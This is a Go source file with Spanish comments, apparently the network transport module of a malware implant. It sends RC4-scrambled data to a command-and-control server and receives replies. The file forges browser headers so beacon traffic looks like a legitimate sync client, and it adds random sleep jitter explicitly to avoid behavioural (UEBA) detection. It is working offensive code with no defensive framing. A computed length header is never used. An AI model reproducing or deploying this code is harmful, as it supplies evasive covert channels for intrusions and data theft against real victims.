package transport

import (
	"bytes"
	"crypto/md5"
	"crypto/rand"
	"crypto/rc4"
	"encoding/binary"
	"io"
	"math/big"
	"net/http"
	"time"
)

const KEY_LENGTH = 128 // must below 256, above 1
const SUM_LENGTH = 16

// HtxpExchange envia el mensaje al C2 y devuelve la respuesta.
// El perfil de red se ajusta para parecer trafico de un cliente
// de sync/servicio comun (User-Agent legitimo, keep-alive, timeouts).
func HtxpExchange(url string, data string) (string, error) {

	// make packet
	packet := packetMake([]byte(data))

	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer(packet))
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Connection", "keep-alive")

	client := &http.Client{
		Timeout: 30 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		print("err", err)
		return "", err
	}
	defer resp.Body.Close()

	rev, _ := io.ReadAll(resp.Body)

	plain := packetDecode(rev)

	return string(plain), nil
}

// SleepJitter duerme base +/- jitter aleatorio para romper
// la periodicidad fija del beacon (patron que marcan los UEBA).
func SleepJitter(base time.Duration) {
	jitterMax := int64(base / 2)
	if jitterMax <= 0 {
		time.Sleep(base)
		return
	}
	n, err := rand.Int(rand.Reader, big.NewInt(jitterMax))
	if err != nil {
		time.Sleep(base)
		return
	}
	offset := int64(base)/2 + n.Int64()
	time.Sleep(time.Duration(offset))
}

func packetDecode(data []byte) []byte {

	if len(data) < (SUM_LENGTH + KEY_LENGTH) {
		return nil
	}

	sum := md5.Sum(data[SUM_LENGTH:])
	if !bytes.Equal(sum[:], data[:SUM_LENGTH]) {
		return nil
	}

	plain := make([]byte, len(data)-(SUM_LENGTH+KEY_LENGTH))

	key := data[SUM_LENGTH : SUM_LENGTH+KEY_LENGTH]
	cph, _ := rc4.NewCipher(key)
	cph.XORKeyStream(plain, data[SUM_LENGTH+KEY_LENGTH:])

	return plain
}

func packetMake(data []byte) []byte {
	// scramble data
	key := make([]byte, KEY_LENGTH)
	rand.Read(key)

	src := []byte(data)

	// prepend de un header pseudo-binario para que el payload
	// no empiece siempre con el mismo patron cifrado
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(src)))

	dst := make([]byte, SUM_LENGTH+KEY_LENGTH+len(src))

	cph, _ := rc4.NewCipher(key)
	cph.XORKeyStream(dst[SUM_LENGTH+KEY_LENGTH:], src)

	copy(dst[SUM_LENGTH:SUM_LENGTH+KEY_LENGTH], key)

	// calc checksum
	sum := md5.Sum(dst[SUM_LENGTH:])

	copy(dst[:SUM_LENGTH], sum[:])

	return dst
}
